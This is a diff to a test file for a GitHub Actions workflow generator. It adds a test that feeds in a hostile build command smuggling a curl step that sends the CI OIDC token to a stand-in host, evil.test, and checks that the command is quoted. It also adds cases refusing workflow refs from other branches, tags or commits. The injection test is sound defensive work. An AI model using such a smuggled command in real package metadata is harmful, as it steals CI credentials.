@@ -259,11 +259,29 @@ describe("workflowYaml", () => {
     expect(yaml).toContain("permissions:\n  contents: read\n  id-token: write\n");
     expect(yaml).not.toMatch(/contents: write|secrets\./);
     expect(yaml).toContain("- run: npm ci");
-    expect(yaml).toContain("- run: npm run build");
+    expect(yaml).toContain('- run: "npm run build"');
     expect(yaml).toContain('(cd "dist" && zip');
     expect(yaml).toContain("&audience=wzrd-create");
     expect(yaml).toContain('"https://air.test/api/create/push"');
     expect(yaml).toContain("cache-dependency-path: \"package-lock.json\"");
+  });
+
+  it("quotes repository-derived commands so package metadata cannot add workflow steps", () => {
+    const hostile = {
+      ...plan,
+      buildCommand: 'npm run build\n      - run: curl -d "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" https://evil.test\n  # "',
+    };
+    const yaml = workflowYaml({
+      branch: "main",
+      dir: "",
+      plan: hostile,
+      pushUrl: "https://air.test/api/create/push",
+      audience: "wzrd-create",
+    });
+    const runs = yaml.split("\n").filter((line) => /^\s+- (run|uses|name):/.test(line));
+    expect(runs).toHaveLength(6);
+    expect(yaml).not.toContain("\n      - run: curl");
+    expect(yaml).toContain('- run: "npm run build\\n      - run: curl -d \\"$ACTIONS_ID_TOKEN_REQUEST_TOKEN\\" https://evil.test\\n  # \\""');
   });
 
   it("works from a subdirectory with pnpm", () => {
@@ -352,6 +370,10 @@ describe("matchBuildLink", () => {
     ["a renamed workflow", { job_workflow_ref: "alice/site/.github/workflows/other.yml@refs/heads/main" }],
     ["a fork's workflow", { job_workflow_ref: `mallory/site/${WORKFLOW_PATH}@refs/heads/main` }],
     ["a path that merely starts alike", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}.bak@refs/heads/main` }],
+    ["the workflow taken from another branch", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@refs/heads/dev` }],
+    ["the workflow taken from a tag", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@refs/tags/v1` }],
+    ["the workflow pinned to a commit", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@${"a".repeat(40)}` }],
+    ["an empty ref", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@` }],
   ])("refuses %s", (_label, over) => {
     expect(matchBuildLink([build], { ...claims, ...over })).toBeNull();
   });
